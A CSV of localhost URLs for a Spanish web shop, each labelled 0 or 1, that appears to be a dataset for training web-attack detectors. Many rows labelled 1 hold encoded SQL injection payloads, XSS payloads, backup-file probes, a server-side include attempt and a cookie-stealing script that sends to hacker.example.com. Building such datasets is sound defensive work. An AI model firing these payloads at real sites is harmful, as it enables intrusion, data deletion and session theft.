URL,Target
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dimitrio&password=a30t0na8&nombre=Zelmar&apellidos=Manj%F3n+Montolio&email=lovelle.lorente%40ringringrent.asia&dni=19110618X&direccion=Alameda+Principal%2C+180+&ciudad=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=40291&provincia=Guip%FAzcoa&ntc=2985545355401012&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org ,1
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/registro.jsp.bak ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=5798&B1=Confirmar ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dorian&password=63a5et%ED5192&nombre=Baldomera&apellidos=Acosta+Hausdorf&email=bolkan%40directoriogratuito.int&dni=71611234K&direccion=C%2F+Cangrexeiras%2C+164%2C+4E&ciudad=Alfam%E9n&cp=50610&provincia=A+Coru%F1a&ntc=6617433173980708&B1=Registrar ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ness&pwd=excuSAdor&remember=offparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&B1=Entrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=6536&B1=Confirmar ,1
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&precio=2939&B1=Pasar+por+caja ,1
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=751&B1=Pasar+por+caja%2F ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3F ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=622&B1=Pasar+por+caja ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shandeig&password=tRaSPiLlA*R&nombre=Jovina&apellidos=Huaripuma+Guisasola&email=lag%40xavipetit.lu&dni=61603039T&direccion=San+Roman+140%2C+2E&ciudad=Puigpunyent&cp=45684&provincia=Zaragoza&ntc=1992808528259508&B1=Registrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85%2F&cantidad=29&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%2B&login=befanis&pwd=PiSoneAR&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vilma&password=73t4h5mbre4&nombre=Rez&apellidos=Calzada+Rebassa&email=vestly.pereda%40ladigianni.eh&dni=72094500B&direccion=Joan+De+Joanes+61+3%3FH&ciudad=Benalup-Casas+Viejas&cp=26291&provincia=Toledo&ntc=8185948553220105&B1=Registrar ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=malott&password=guayabo&nombre=Dalmiro&apellidos=Farr%E9&email=haddon%40hiperbarcelona.tl&dni=29424173C&direccion=Plza.+Luis+Cernuda%2C+88+&ciudad=Villodrigo&cp=08580&provincia=Sevilla&ntc=0604900519989178&B1=Registrar ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/asf-logo-wide ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=skipp&pwd=bra3o&rememberA=on&B1=Entrar ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=seyfolla&pwd=c85o%277rer6&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/_cti_pvt/linkinfo.cnf ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=meissner5&password=64ua4litar89&nombre=Pandora&apellidos=Bustos+Oliva&email=defauce%40farma-job.ro&dni=28677228T&direccion=Avenida+Heroes+De+Baler%2C+190%2C+&ciudad=S.anta%2F+Cilia&cp=15984&provincia=Burgos&ntc=0324680856552215&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=44&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1.Bak ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/asf-logo-wide.gif ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=carolina&password=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&nombre=Ihor&apellidos=M%FAgica+Vall%E9s&email=urecal8%40espanolynegocios.bu&dni=67961648Y&direccion=Av.+Olimpica%2C+156+&ciudad=Navajas&cp=43941&provincia=Madrid&ntc=2515177122592288&B1=Registrar ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=satkamp&password=6asc5oSo&nombre=N%E9lida&apellidos=%2B&email=hurst%40guejos.iq&dni=91086664V&direccion=Callejon+Cinco+Minutos%2C+31+6%3FD&ciudad=Sieteiglesias+de+Tormes&cp=40355&provincia=Vizcaya&ntc=5805357208824154&B1=Registrar ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tudor&password=28a2quizo&nombre=Camilo&apellidos=Eremian+De+la+Sota&email=lauterbach%40nanogenerador.ic&dni=24061408G&direccion=Mesa+169%2C+&ciudad=Ciudad+Real&cpA=08553&provincia=Badajoz&ntc=5945196331395771&B1=Registrar ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=%4040&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=59&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/6909030637832563290.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=odelinda&pwd=4056lan0e&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=80&B1A=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif/asf-logo-wide.gif/.BAK ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kinley3&password=rigente&nombre=Pericles&apellidos=Barr%E9s+Obrador&email=modugno%40wdsl.int&dni=75459581P&direccion=C%2F+Pista%2C+101+&ciudad=Corcos&cp=26111&provincia=Albacete&ntc=0379584529465876&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp~ ,1
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=luke&password=9e3ed330a&nombre=No%E9&apellidos=Cassasola+Nochez&email=story.darby%40hostingprofessional.mv&dni=74469828Z&direccion=Plza.+San+Felipe+De+Neri%2C+174%2C+10-A&ciudad=Navalperal+de+Pinares&cp=16926&provincia=Zamora&ntc=9369957751298243&B1=Registrar ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boon-sio&password=seR%F3tino&nombre=Salvatore&apellidos=Clusella+Baldom%E0&email=medwin-whittinghill%40enla.th&dni=19552581M&direccion=C%2F+Iguazu%2C+109%2C+8%3FA&ciudad=Tarr%E9s&cp=15552&provincia=Granada&ntc=2870695496862517&B1=Registrar ,0
http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif/.Inc ,1
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=40%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=79&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mckillop&password=margraviato&nombre=Leonor&apellidos=Pantiga+Corredor&email=miranoa%40enla.web&dni=36674466T&direccion=Mencia+Calderon%2C+170%2C+13B&ciudad=Manzanares+de+Rioja&cp=05427&provincia=Vizcaya&ntc=465413385488172&B1=Registrar ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/miembros.jsp/4861362529278789730.java ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2796&B1=Pasar+por+caja%2F ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=200&B1=Pasar+por+caja%2500 ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4005&B1=Confirmar ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/miembros.jsp/4861362529278789730.INC ,1
http://localhost:8080/tienda1/imagenes/logo.gif.Bak ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=grange&pwd=col2g3e%27+AND+%271%27%3D%271&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/compass/logon.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=79&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4244&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=91&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27+DELETE+FROM+USERS&precio=806&B1=Confirmar ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/iissamples/ExAir/Catalog/Catalog.asp ,1
http://localhost:8080/iissamples/ExAir/FunNGames/FunNGames.asp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&cantidad=66&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=overton&password=ceRveCeR%EDA&nombre=Cosme&apellidos=Viladomat+Gasull&email=shiomi%40errebebe.ug&dni=70489976J&direccion=Calle+Muelles%2C+70%2C+6G&ciudad=Vilob%ED+del+Pened%E8s&cp=45908&provincia=Toledo&ntc=4750834665833814&B1=Registrar ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sisely&pwd=doble&remember=on&B1=Entrar%22+AND+%221%22%3D%221 ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080.BAK ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/miembros/fotos.jsp/4861362529278789730.Old ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/asf-logo-wide.gif/.INC ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1.BAK ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lazure&password=carapopela&nombre=Galatas&apellidos=Espelt+Bone&email=martens%40ajuntamentbarcelona2-0.tl&dni=66226006J&direccion=San+Luis%2C+117%2C+&ciudad=Ca%F1ada+del+Hoyo&cp=10940&provincia=Zamora&ntc=0639487553835350&B1=Registrar ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/4861362529278789730 ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=12&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif.Inc ,1
http://localhost:8080/tienda1/global/estilos.css ,0
